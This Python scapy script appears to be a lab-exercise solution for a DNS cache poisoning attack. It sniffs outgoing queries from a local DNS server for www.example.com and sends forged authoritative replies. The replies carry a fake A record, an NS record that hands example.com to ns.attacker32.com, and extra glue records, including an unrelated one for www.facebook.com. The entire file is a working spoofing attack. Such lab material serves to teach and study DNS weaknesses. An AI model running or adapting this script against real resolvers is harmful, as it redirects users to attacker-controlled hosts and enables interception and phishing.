#!/usr/bin/env python3
from scapy.all import *

# ----------------- CONFIG -----------------
LOCAL_DNS_IP = "10.9.0.53"
IFACE = "br-8eecaee5cc49"  # Update with your actual interface

TARGET_DOMAIN = "www.example.com"
FAKE_IP = "10.9.0.1"  # Fake IP for www.example.com

# ------------------------------------------

def spoof_task5(pkt):
    if DNS in pkt and pkt[DNS].qd is not None and pkt[DNS].qr == 0:
        qname = pkt[DNS].qd.qname.decode('utf-8')
        src_ip = pkt[IP].src

        # Only handle DNS server queries for www.example.com
        if src_ip == LOCAL_DNS_IP and qname.strip('.') == TARGET_DOMAIN:
            print(f"[+] Intercepted DNS query for {qname.strip()}")

            # Build fake IP header (swap src/dst)
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            udp = UDP(sport=53, dport=pkt[UDP].sport)

            # 1. ANSWER SECTION: Fake A record for www.example.com
            ans = DNSRR(
                rrname=qname,
                type='A',
                ttl=259200,
                rdata=FAKE_IP
            )

            # 2. AUTHORITY SECTION: One NS record for example.com
            ns_record = DNSRR(
                rrname="example.com.",
                type='NS',
                ttl=259200,
                rdata="ns.attacker32.com."
            )

            # 3. ADDITIONAL SECTION: Three A records as specified
            add1 = DNSRR(
                rrname="ns.attacker32.com.",
                type='A',
                ttl=259200,
                rdata='1.2.3.4'  # Related to Authority section
            )
            
            add2 = DNSRR(
                rrname="ns.example.net.",
                type='A', 
                ttl=259200,
                rdata='5.6.7.8'  # Another NS (not in Authority)
            )
            
            add3 = DNSRR(
                rrname="www.facebook.com.",
                type='A',
                ttl=259200,
                rdata='3.4.5.6'  # Completely unrelated
            )

            # Construct DNS packet
            dns = DNS(
                id=pkt[DNS].id,
                qr=1,      # Response
                aa=1,      # Authoritative answer
                rd=0,      # Recursion desired = 0
                qd=pkt[DNS].qd,  # Original query
                an=ans,          # Answer section
                ns=ns_record,    # Authority section (1 NS record)
                ar=add1/add2/add3,  # Additional section (3 A records)
                qdcount=1,
                ancount=1,
                nscount=1,
                arcount=3
            )

            spoofpkt = ip / udp / dns
            print("[+] Sending spoofed DNS reply with:")
            print(f"    Answer: www.example.com → {FAKE_IP}")
            print(f"    Authority: example.com NS ns.attacker32.com")
            print(f"    Additional: 3 A records (attacker32, example.net, facebook)")
            
            send(spoofpkt, iface=IFACE, verbose=0)


def main():
    myFilter = f"udp and src host {LOCAL_DNS_IP} and dst port 53"
    print(f"[*] Sniffing on {IFACE}")
    print(f"[*] Filter: {myFilter}")
    print("[*] Waiting for www.example.com queries from local DNS server...")
    
    sniff(iface=IFACE, filter=myFilter, prn=spoof_task5, store=0)


if __name__ == "__main__":
    main()
